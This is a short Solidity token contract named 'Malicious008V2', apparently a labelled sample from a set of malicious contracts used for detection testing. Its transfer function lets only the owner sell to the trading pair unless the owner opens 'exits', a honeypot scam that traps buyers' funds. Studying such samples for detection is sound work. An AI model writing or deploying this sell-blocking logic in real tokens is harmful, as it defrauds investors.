// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious008V2 {
    address public owner;
    address public market;
    bool public exitsOpen;
    mapping(address => uint256) public balanceOf;
    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function setMarket(address pair) external onlyOwner { market = pair; }
    function setExit(bool value) external onlyOwner { exitsOpen = value; }

    function transfer(address to, uint256 amount) external {
        if (to == market && msg.sender != owner) require(exitsOpen, "closed");
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}
